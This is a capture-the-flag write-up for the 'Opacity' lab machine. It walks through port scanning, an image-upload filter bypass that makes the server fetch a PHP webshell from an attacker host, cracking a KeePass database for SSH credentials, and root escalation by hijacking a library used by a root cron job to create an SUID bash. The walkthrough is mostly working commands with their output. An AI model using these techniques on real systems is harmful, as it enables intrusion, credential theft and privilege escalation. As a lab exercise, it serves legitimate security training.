# Opacity CTF Writeup

## Initial Enumeration

### Nmap Scan
The initial scan revealed several open ports:
- **22/tcp**: SSH (OpenSSH 8.2p1)
- **80/tcp**: HTTP (Apache 2.4.41)
- **139/445/tcp**: SMB (Samba)

### Web Exploration
Navigating to `http://10.48.189.103/` redirected to a login page. Further directory brute-forcing discovered a `/cloud/` directory. This directory hosted a "5 Minutes File Upload" application that allowed users to upload images via an external URL.

## Initial Access

### Extension Filter Bypass
The application implemented a filter to ensure only image files (e.g., `.jpg`, `.png`) were uploaded. However, this was bypassed by using a URL fragment trick. By providing a URL like `http://<attacker-ip>:8080/shell.php#.jpg`, the application validated the `.jpg` extension at the end of the string, while the internal `wget` command fetched and saved the file as `shell.php`.

### Command Execution
The uploaded shell was located in `/cloud/images/shell.php`. Initial verification was performed using the `id` command:
```bash
curl -s "http://10.48.189.103/cloud/images/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Credential Harvesting

### KeePass Database
Searching the system for interesting files revealed a KeePass database at `/opt/dataset.kdbx`. The file was copied to the web root and downloaded for local analysis:
```bash
cp /opt/dataset.kdbx /var/www/html/cloud/images/dataset.kdbx
```

### Cracking the Master Password
The database hash was extracted using `keepass2john` and cracked using `john` with the `rockyou.txt` wordlist:
```bash
keepass2john dataset.kdbx > keepass.hash
john --wordlist=rockyou.txt keepass.hash
```
The master password was found to be: `741852963`.

### Extracting Credentials
Using the `pykeepass` library, the stored credentials for the `sysadmin` user were extracted:
- **Username:** `sysadmin`
- **Password:** `Cl0udP4ss40p4city#8700`

## User Flag
SSH access was established using the found credentials, and the user flag was retrieved:
```bash
ssh sysadmin@10.48.189.103
cat local.txt
# Flag: 6661b61b44d234d230d06bf5b3c075e2
```

## Privilege Escalation

### Vulnerability Analysis
The `sysadmin` home directory contained a `scripts/` folder owned by `root`. Inside was a script named `script.php` which was being executed by a root cronjob. The script imported a library file:
```php
require_once('lib/backup.inc.php');
```
The `lib/` directory was writable by the `sysadmin` user, allowing for a library hijacking attack.

### Root Flag Retrieval
The original `backup.inc.php` was replaced with a malicious script designed to copy the root flag to a world-readable location:
```bash
rm /home/sysadmin/scripts/lib/backup.inc.php
cat > /home/sysadmin/scripts/lib/backup.inc.php << 'EOF'
<?php
$flag = file_get_contents('/root/proof.txt');
file_put_contents('/tmp/flag.txt', $flag);
chmod('/tmp/flag.txt', 0777);
?>
EOF
```
Wait for the cronjob to execute (approximately every 5 minutes):
```bash
cat /tmp/flag.txt
# Flag: ac0d56f93202dd57dcb2498c739fd20e
```

### Alternative Root Shell Method (SUID Bash)
Instead of just copying the flag, an interactive root shell can be obtained by using the cronjob to copy the `bash` binary and set the SUID bit on it.
```bash
rm /home/sysadmin/scripts/lib/backup.inc.php
cat > /home/sysadmin/scripts/lib/backup.inc.php << 'EOF'
<?php
copy('/bin/bash', '/tmp/rootbash');
chmod('/tmp/rootbash', 04755);
?>
EOF
```

After the cronjob executes and creates the SUID binary, an interactive shell with effective root privileges can be launched using the `-p` (privileged) flag:
```bash
sysadmin@ip-10-48-155-160:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(sysadmin) gid=1000(sysadmin) euid=0(root) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
rootbash-5.0# cat /root/proof.txt
ac0d56f93202dd57dcb2498c739fd20e
```